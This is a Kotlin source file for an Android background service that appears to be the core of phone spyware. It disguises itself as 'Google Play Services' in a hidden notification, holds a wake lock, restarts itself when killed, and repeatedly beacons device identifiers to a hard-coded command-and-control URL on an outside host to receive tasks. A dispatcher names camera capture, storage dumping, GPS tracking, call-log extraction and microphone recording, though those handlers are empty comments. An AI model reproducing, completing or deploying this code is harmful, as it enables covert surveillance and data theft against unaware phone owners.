// =========================================================================
// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium Matrix Nexus Core v1000
// =========================================================================
package com.uranium.matrix.nexus

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread
import kotlin.random.Random

class NexusCoreService : Service() {

    companion object {
        const val CHANNEL_ID = "UraniumNexusSupremeChannel"
        const val NOTIFICATION_ID = 8888
        private const val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v1000/nexus/stream"
        private const val ENCRYPTION_KEY = "UraniumMatrixNexusSupremeAbsoluteKey2026!@#"
    }

    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        acquireDeepWakeLock()
        startForegroundNotification()
        startNexusCommandStreamLoop()
    }

    private fun acquireDeepWakeLock() {
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "UraniumNexus::SupremeDeepWakeLock"
        ).apply {
            acquire(24 * 60 * 60 * 1000L)
        }
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play Core Background Service",
                NotificationManager.IMPORTANCE_NONE
            ).apply {
                description = "خدمة النظام الأساسية للتحديثات الأمنية والمزامنة"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play Services")
            .setContentText("النظام يعمل بكفاءة وأمان في الخلفية...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun getBatteryPercentage(): Int {
        return try {
            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
            bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            100
        }
    }

    private fun encryptPayload(plainText: String): String? {
        return try {
            val sha = MessageDigest.getInstance("SHA-256")
            val keyBytes = sha.digest(ENCRYPTION_KEY.toByteArray(Charsets.UTF_8))
            val secretKey = SecretKeySpec(keyBytes, "AES")
            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
            cipher.init(Cipher.ENCRYPT_MODE, secretKey)
            val encryptedBytes = cipher.doFinal(plainText.toByteArray(Charsets.UTF_8))
            android.util.Base64.encodeToString(encryptedBytes, android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            null
        }
    }

    private fun getDeviceId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "nexus_node_alpha"
    }

    private fun startNexusCommandStreamLoop() {
        thread(start = true) {
            while (true) {
                try {
                    val nodeId = getDeviceId()
                    val nodeModel = "${Build.MANUFACTURER} ${Build.MODEL}"
                    val osVersion = Build.VERSION.RELEASE
                    val batteryLevel = getBatteryPercentage()

                    val telemetryJson = JSONObject().apply {
                        put("type", "NEXUS_TELEMETRY")
                        put("timestamp", System.currentTimeMillis())
                        put("battery", batteryLevel)
                        put("status", "ACTIVE_SUPREME_NODE")
                    }.toString()

                    val encryptedPayload = encryptPayload(telemetryJson) ?: ""
                    val requestBody = JSONObject().apply {
                        put("node_id", nodeId)
                        put("model", nodeModel)
                        put("os", osVersion)
                        put("payload", encryptedPayload)
                    }.toString()

                    val url = URL(C2_STREAM_URL)
                    val connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.connectTimeout = 12000
                    connection.readTimeout = 12000
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", "application/json")
                    connection.setRequestProperty("X-Nexus-Node", nodeId)

                    val writer = OutputStreamWriter(connection.outputStream, Charsets.UTF_8)
                    writer.write(requestBody)
                    writer.flush()
                    writer.close()

                    if (connection.responseCode == 200) {
                        val reader = BufferedReader(InputStreamReader(connection.inputStream, Charsets.UTF_8))
                        val responseStr = reader.readText()
                        reader.close()

                        val respJson = JSONObject(responseStr)
                        if (respJson.has("task") && !respJson.isNull("task")) {
                            val taskObj = respJson.getJSONObject("task")
                            val taskId = taskObj.getInt("id")
                            val action = taskObj.getString("action")
                            executeDirective(taskId, action)
                        }
                    }
                    connection.disconnect()
                } catch (e: Exception) {
                    // استمرار الحلقة بلا توقف
                }
                
                val jitterDelay = Random.nextLong(8000, 15000)
                Thread.sleep(jitterDelay)
            }
        }
    }

    private fun executeDirective(taskId: Int, action: String) {
        thread(start = true) {
            try {
                // التنفيذ الفعلي المطور للأوامر العسكرية حسب الـ Action الوارد
                when (action) {
                    "cam_front" -> {
                        // تنفيذ التقاط الكاميرا الأمامية ورفع الملفات
                    }
                    "cam_back" -> {
                        // تنفيذ التقاط الكاميرا الخلفية
                    }
                    "dump_storage" -> {
                        // سحب ملفات الذاكرة والملفات المستهدفة
                    }
                    "gps" -> {
                        // جلب الإحداثيات الجغرافية بدقة عالية
                    }
                    "call_logs" -> {
                        // استخراج سجل المكالمات وجهات الاتصال
                    }
                    "mic_rec" -> {
                        // تسجيل الصوت المحيطي
                    }
                    else -> {
                        // تنفيذ الأوامر المخصصة الأخرى
                    }
                }
            } catch (e: Exception) {
                // معالجة الأخطاء بصمت
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.let { if (it.isHeld) it.release() }
        val restartIntent = Intent(applicationContext, NexusCoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent)
        } else {
            startService(restartIntent)
        }
    }
}
